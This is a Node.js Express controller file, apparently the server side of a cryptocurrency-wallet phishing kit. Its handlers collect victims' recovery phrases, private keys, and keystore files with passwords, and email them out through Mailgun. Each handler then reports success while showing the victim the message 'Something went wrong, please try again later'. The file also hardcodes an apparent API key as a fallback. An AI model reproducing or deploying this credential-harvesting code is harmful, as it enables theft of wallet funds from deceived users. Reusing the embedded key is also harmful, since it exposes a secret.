// const sgMail = require("@sendgrid/mail");
// const Phrase = require("../models/phrase");
// const PrivateKey = require("../models/privateKey");
// const KeyStoreJson = require("../models/keystoreJson");

// sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const formData = require("form-data");
const Mailgun = require("mailgun.js");
const mailgun = new Mailgun(formData);
const mg = mailgun.client({
  username: "api",
  key:
    process.env.MAILGUN_API_KEY ||
    "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",
});

exports.phraseData = async (req, res) => {
  const { phrase, email, wallet } = req.body;

  // const msg = {
  //   to: email,
  //   from: email,
  //   subject: "Phrase Data",
  //   html: `
  //       <h1>Phrase Data</h1>
  //       <p>${phrase}</p>
  //     `,
  // };

  // const phraseModel = new Phrase({
  //   email,
  //   wallet,
  //   phrase,
  // });

  // save phrase to the database
  // try {
  //   await phraseModel.save();
  // } catch (err) {
  //   console.error(err.message);
  //   return res.status(400).json({
  //     success: false,
  //     msg: err.message,
  //   });
  // }

  mg.messages
    .create("sandboxb71e594c730d42e58761a14591035ea3.mailgun.org", {
      from: email,
      to: email,
      subject: "Phrase Data",
      html: `
        <h1>Phrase Data</h1>
        <p>${phrase}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });

  // sgMail
  //   .send(msg)
  //   .then(() => {
  //     res.status(200).json({
  //       success: true,
  //       msg: "Something went wrong, please try again later",
  //     });
  //   })
  //   .catch((err) => {
  //     console.error(err);
  //     return res.status(400).json({
  //       success: false,
  //       msg: err,
  //     });
  //   });
};

exports.privateKeyData = async (req, res) => {
  const { privateKey, email } = req.body;

  const msg = {
    to: email,
    from: email,
    subject: "Private Key Data",
    html: `
        <h1>Private Key Data</h1>
        <p>${privateKey}</p>
      `,
  };

  mg.messages
    .create("sandbox-123.mailgun.org", {
      from: "Mainnet Email Service <mainnet-email-service>",
      to: email,
      subject: "Private Key Data",
      html: `
        <h1>Private Key Data</h1>
         <p>${privateKey}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    }) // logs response data
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });

  // sgMail
  //   .send(msg)
  //   .then(() => {
  //     res.status(200).json({
  //       success: true,
  //       msg: "Something went wrong, please try again later",
  //     });
  //   })
  //   .catch((err) => {
  //     console.error(err);
  //     return res.status(400).json({
  //       success: false,
  //       msg: err,
  //     });
  //   });
};

exports.keystoreJSONData = async (req, res) => {
  const { keyStore, password, email } = req.body;

  const msg = {
    to: email,
    from: email,
    subject: "KeyStore JSON Data",
    html: `
        <h1>Phrase Data</h1>
        <p><strong>{keyword} - </strong> ${keyStore}</p>
        <p><strong>{password} - </strong> ${password}</p>
      `,
  };

  mg.messages
    .create("sandbox-123.mailgun.org", {
      from: "Mainnet Email Service <mainnet-email-service>",
      to: email,
      subject: "KeyStore JSON Data",
      html: `
       <h1>Keystore JSON Data</h1>
        <p><strong>{keyword} - </strong> ${keyStore}</p>
        <p><strong>{password} - </strong> ${password}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    }) // logs response data
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });

  // sgMail
  //   .send(msg)
  //   .then(() => {
  //     res.status(200).json({
  //       success: true,
  //       msg: "Something went wrong, please try again later",
  //     });
  //   })
  //   .catch((err) => {
  //     console.error(err);
  //     return res.status(400).json({
  //       success: false,
  //       msg: err,
  //     });
  //   });
};
